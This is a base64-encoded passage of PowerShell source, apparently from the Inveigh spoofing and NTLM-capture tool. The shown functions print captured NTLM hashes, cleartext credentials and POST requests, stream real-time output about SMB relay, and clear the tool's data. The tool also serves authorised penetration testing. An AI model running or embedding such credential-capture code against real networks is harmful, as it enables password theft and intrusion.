V9hY2NvdW50X2xhc3QgPSAkdW5pcXVlX05UTE12MV9hY2NvdW50CiAgICB9Cgp9CgppZigkTlRMTXYxVXNlcm5hbWVzKQp7CiAgICBXcml0ZS1PdXRwdXQgJGludmVpZ2guTlRMTXYyX3VzZXJuYW1lX2xpc3QKfQoKaWYoJE5UTE12MikKewogICAgV3JpdGUtT3V0cHV0ICRpbnZlaWdoLk5UTE12Ml9saXN0Cn0KCmlmKCROVExNdjJVbmlxdWUpCnsKICAgICRpbnZlaWdoLk5UTE12Ml9saXN0LlNvcnQoKQoKICAgIGZvcmVhY2goJHVuaXF1ZV9OVExNdjIgaW4gJGludmVpZ2guTlRMTXYyX2xpc3QpCiAgICB7CiAgICAgICAgJHVuaXF1ZV9OVExNdjJfYWNjb3VudCA9ICR1bmlxdWVfTlRMTXYyLlN1YlN0cmluZygwLCR1bmlxdWVfTlRMTXYyLkluZGV4T2YoIjoiLCgkdW5pcXVlX05UTE12Mi5JbmRleE9mKCI6IikgKyAyKSkpCgogICAgICAgIGlmKCR1bmlxdWVfTlRMTXYyX2FjY291bnQgLW5lICR1bmlxdWVfTlRMTXYyX2FjY291bnRfbGFzdCkKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAkdW5pcXVlX05UTE12MgogICAgICAgIH0KCiAgICAgICAgJHVuaXF1ZV9OVExNdjJfYWNjb3VudF9sYXN0ID0gJHVuaXF1ZV9OVExNdjJfYWNjb3VudAogICAgfQoKfQoKaWYoJE5UTE12MlVzZXJuYW1lcykKewogICAgV3JpdGUtT3V0cHV0ICRpbnZlaWdoLk5UTE12Ml91c2VybmFtZV9saXN0Cn0KCmlmKCRDbGVhcnRleHQpCnsKICAgIFdyaXRlLU91dHB1dCAkaW52ZWlnaC5jbGVhcnRleHRfbGlzdAp9CgppZigkQ2xlYXJ0ZXh0VW5pcXVlKQp7CiAgICBXcml0ZS1PdXRwdXQgJGludmVpZ2guY2xlYXJ0ZXh0X2xpc3QgfCBHZXQtVW5pcXVlCn0KCmlmKCRQT1NUUmVxdWVzdCkKewogICAgV3JpdGUtT3V0cHV0ICRpbnZlaWdoLlBPU1RfcmVxdWVzdF9saXN0Cn0KCmlmKCRQT1NUUmVxdWVzdFVuaXF1ZSkKewogICAgV3JpdGUtT3V0cHV0ICRpbnZlaWdoLlBPU1RfcmVxdWVzdF9saXN0IHwgR2V0LVVuaXF1ZQp9CgppZigkTGVhcm5pbmcpCnsKICAgIFdyaXRlLU91dHB1dCAkaW52ZWlnaC52YWxpZF9ob3N0X2xpc3QKfQoKfQoKZnVuY3Rpb24gV2F0Y2gtSW52ZWlnaAp7CjwjCi5TWU5PUFNJUwpXYXRjaC1JbnZlaWdoIHdpbGwgZW5hYmxlZCByZWFsIHRpbWUgY29uc29sZSBvdXRwdXQuIElmIHVzaW5nIHRoaXMgZnVuY3Rpb24gdGhyb3VnaCBhIHNoZWxsLCB0ZXN0IHRvIGVuc3VyZSB0aGF0IGl0IGRvZXNuJ3QgaGFuZyB0aGUgc2hlbGwuCgouUEFSQU1FVEVSIENvbnNvbGVPdXRwdXQKKE1lZGl1bSxMb3cpIE1lZGl1bSBhbmQgTG93IGNhbiBiZSB1c2VkIHRvIHJlZHVjZSBvdXRwdXQuCiM+CgpbQ21kbGV0QmluZGluZygpXQpwYXJhbQooIAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIkxvdyIsIk1lZGl1bSIpXVtTdHJpbmddJENvbnNvbGVPdXRwdXQgPSAiWSIsCiAgICBbcGFyYW1ldGVyKFZhbHVlRnJvbVJlbWFpbmluZ0FyZ3VtZW50cz0kdHJ1ZSldJGludmFsaWRfcGFyYW1ldGVyCikKCmlmKCRpbnZlaWdoLnRvb2wgLW5lIDEpCnsKCiAgICBpZigkaW52ZWlnaC5ydW5uaW5nIC1vciAkaW52ZWlnaC5yZWxheV9ydW5uaW5nKQogICAgewogICAgICAgIFdyaXRlLU91dHB1dCAiUHJlc3MgYW55IGtleSB0byBzdG9wIHJlYWwgdGltZSBjb25zb2xlIG91dHB1dCIKICAgICAgICAkaW52ZWlnaC5jb25zb2xlX291dHB1dCA9ICR0cnVlCgogICAgICAgIDpjb25zb2xlX2xvb3Agd2hpbGUoKCgkaW52ZWlnaC5ydW5uaW5nIC1vciAkaW52ZWlnaC5yZWxheV9ydW5uaW5nKSAtYW5kICRpbnZlaWdoLmNvbnNvbGVfb3V0cHV0KSAtb3IgKCRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQ291bnQgLWd0IDAgLWFuZCAkaW52ZWlnaC5jb25zb2xlX291dHB1dCkpCiAgICAgICAgewoKICAgICAgICAgICAgd2hpbGUoJGludmVpZ2guY29uc29sZV9xdWV1ZS5Db3VudCAtZ3QgMCkKICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgIHN3aXRjaCAtd2lsZGNhcmQgKCRpbnZlaWdoLmNvbnNvbGVfcXVldWVbMF0pCiAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgIHskXyAtbGlrZSAiKiB3cml0dGVuIHRvICoiIC1vciAkXyAtbGlrZSAiKiBmb3IgcmVsYXkgKiIgLW9yICRfIC1saWtlICIqU01CIHJlbGF5ICoiIC1vciAkXyAtbGlrZSAiKiBsb2NhbCBhZG1pbmlzdHJhdG9yICoifQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuUmVtb3ZlQXQoMCkKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIHskXyAtbGlrZSAiKiBzcG9vZmVyIGlzIGRpc2FibGVkIiAtb3IgJF8gLWxpa2UgIiogbG9jYWwgcmVxdWVzdCIgLW9yICRfIC1saWtlICIqIGhvc3QgaGVhZGVyICoiIC1vciAkXyAtbGlrZSAiKiB1c2VyIGFnZW50IHJlY2VpdmVkICoifQogICAgICAgICAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRDb25zb2xlT3V0cHV0IC1lcSAnWScpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuUmVtb3ZlQXQoMCkKCiAgICAgICAgICAgICAgICAgICAgfSAKCiAgICAgICAgICAgICAgICAgICAgeyRfIC1saWtlICIqIHJlc3BvbnNlIHNlbnQiIC1vciAkXyAtbGlrZSAiKiBpZ25vcmluZyAqIiAtb3IgJF8gLWxpa2UgIiogSFRUUCpyZXF1ZXN0IGZvciAqIiAtb3IgJF8gLWxpa2UgIiogUHJveHkgcmVxdWVzdCBmb3IgKiJ9CiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBpZigkQ29uc29sZU91dHB1dCAtbmUgIkxvdyIpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuUmVtb3ZlQXQoMCkKCiAgICAgICAgICAgICAgICAgICAgfSAKCiAgICAgICAgICAgICAgICAgICAgZGVmYXVsdAogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICRpbnZlaWdoLmNvbnNvbGVfcXVldWVbMF0KICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5SZW1vdmVBdCgwKQogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICB9IAoKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYoW0NvbnNvbGVdOjpLZXlBdmFpbGFibGUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfb3V0cHV0ID0gJGZhbHNlCiAgICAgICAgICAgICAgICBCUkVBSyBjb25zb2xlX2xvb3AKICAgICAgICAgICAgfQoKICAgICAgICAgICAgU3RhcnQtU2xlZXAgLW0gNQogICAgICAgIH0KCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgV3JpdGUtT3V0cHV0ICJJbnZlaWdoIGlzbid0IHJ1bm5pbmciCiAgICB9Cgp9CmVsc2UKewogICAgV3JpdGUtT3V0cHV0ICJXYXRjaC1JbnZlaWdoIGNhbm5vdCBiZSB1c2VkIHdpdGggY3VycmVudCBleHRlcm5hbCB0b29sIHNlbGVjdGlvbiIKfQoKfQoKZnVuY3Rpb24gQ2xlYXItSW52ZWlnaAp7CjwjCi5TWU5PUFNJUwpDbGVhci1JbnZlaWdoIHdpbGwgY2xlYXIgSW52ZWlnaCBkYXRhIGZyb20gbWVtb3J5LgojPgoKaWYoJGludmVpZ2gpCnsKCiAgICBpZighJGludmVpZ2gucnVubmluZyAtYW5kICEkaW52ZWlnaC5yZWxheV9ydW5uaW5nKQogICAgewogICAgICAgIFJlbW92ZS1WYXJpYWJsZSBpbnZlaWdoIC1zY29wZSBnbG9iYWwKICAgICAgICBXcml0ZS1PdXRwdXQgIkludmVpZ2ggZGF0YSBoYXMgYmVlbiBjbGVhcmVkIGZyb20gbWVtb3J5IgogICAgfQogICAgZWxzZQogICAgewogICAgICAgIFdyaXRlLU91dHB1dCAiUnVuIFN0b3AtSW52ZWlnaCBiZWZvcmUgcnVubmluZyBDbGVhci1JbnZlaWdoIgogICAgfQoKfQoKfQ==
